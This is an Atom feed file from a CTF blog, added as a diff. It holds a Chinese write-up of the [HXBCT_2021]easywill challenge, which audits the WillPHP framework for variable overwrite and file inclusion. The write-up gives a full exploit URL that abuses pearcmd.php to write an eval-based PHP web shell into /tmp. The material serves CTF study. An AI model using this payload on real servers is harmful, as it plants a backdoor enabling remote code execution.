@@ -1,0 +1,113 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;willphp2.2&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-11-05T06:48:54.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <category term="willphp2.2" />
+    <category term="ssti-smarty3.1.39" />
+    <entry>
+        <id>http://odiws.github.io/2024/11/05/HXBCT-2021-easywill/</id>
+        <title>[HXBCT_2021]easywill</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/11/05/HXBCT-2021-easywill/"/>
+        <content type="html">&lt;h2 id=&#34;hxbct_2021easywill&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hxbct_2021easywill&#34;&gt;#&lt;/a&gt; [HXBCT_2021]easywill&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/e0a25038b09956fb373c468cfd1c6742.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这题 index 上给的代码很短，需要下载框架源码，自行修改审计。我没找到 2.1.5 的源码，下了个最新的。这题比赛的时候看了到 assign 函数还以为是个模板注入的题以为要爆破模板变量名就没去整了。还是对调试这种不太熟吧，下意识不想审计框架的函数调用&lt;/p&gt;
+&lt;p&gt;下面开始审计，修改 app/controller/IndexController.php 的内容与题目给出的一致&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/9ad16222b7834907d68c96eba474b106.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;先跟踪 assign 函数&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/40e90aa89ff48f974be1a581fd4b920e.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/dd0d0cad4f3b00bcc99a7beae73d032b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;assign 只是做一个赋值的作用 传递给 view 当中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/90d464a14ff58d2d99a85a05a2176487.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;再看 view 函数&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/4190741973dd63dfef13d2e6d05f23e9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/48e3f9825649f30f662cfc78d5225b17.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/2786d46e6353bc38700ca3da07adc943.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/629c3064ed9eeef075950e674c36c3ab.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到存在变量覆盖以及文件包含&lt;/p&gt;
+&lt;p&gt;开启 debug 可以看到函数调用栈，这里测试传参为 &amp;amp; name=cfile&amp;amp;value=1&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/1ce743e5d6245779915f9e6319b65ff7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;写入 shell 到 tmp 目录，这里为什么包含 pearcmd.php 的原因详见：利用 pearcmd.php 从 LFI 到 getshell_feng 的博客 - CSDN 博客&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/6a402e8cec85a18bb81515185aef8f59.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/?name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;+-c+/tmp/test2.php+-d+man_dir=&amp;lt;?eval($_POST[0]);?&amp;gt;+-s+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051504825.png&#34; alt=&#34;image-20241105150358707&#34;&gt;&lt;/p&gt;
+&lt;p&gt;记得用 burp 浏览器直接打的话 &amp;lt;&amp;gt; 会被 url 编码，写马就不解析了&lt;/p&gt;
+&lt;p&gt;转载（没有源码，只能下下来了）：&lt;/p&gt;
+&lt;h4 id=&#34;原文链接httpsblogcsdnnetweixin_43610673articledetails121369384&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原文链接httpsblogcsdnnetweixin_43610673articledetails121369384&#34;&gt;#&lt;/a&gt; 原文链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzYxMDY3My9hcnRpY2xlL2RldGFpbHMvMTIxMzY5Mzg0&#34;&gt;https://blog.csdn.net/weixin_43610673/article/details/121369384&lt;/span&gt;&lt;/h4&gt;
+</content>
+        <category term="buuctf" />
+        <category term="willphp2.2" />
+        <updated>2024-11-05T06:48:54.000Z</updated>
+    </entry>
+</feed>
